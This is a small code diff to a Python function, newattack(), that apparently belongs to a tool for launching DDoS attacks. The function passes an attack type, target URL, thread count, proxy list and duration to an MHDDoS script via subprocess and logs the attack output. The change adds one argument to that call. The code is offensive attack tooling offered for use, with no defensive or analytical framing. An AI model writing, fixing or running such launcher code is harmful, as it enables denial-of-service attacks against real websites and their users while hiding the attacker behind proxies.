@@ -66,7 +66,7 @@ def newattack():
         out = "ERROR"
         def run_attack():
             global out
-            arguments = [f"{type_attack}", f"{url}", str(0), str(100), "proxies.txt", f"{time}"]
+            arguments = [f"{type_attack}", f"{url}", str(0), str(100), "proxies.txt",str(0) , f"{time}"]
             command = ["python3", "data/mhddos/start.py"] + arguments
 
             try:
@@ -82,7 +82,7 @@ def newattack():
                 process.stderr.close()
                 process.wait()
                 LOGS.info("ATTACK ARGUMENTS: " + str(arguments))
-                
+
                 LOGS.info(f"Attack output: {out}")
 
                 LOGS.info("Attack completed")
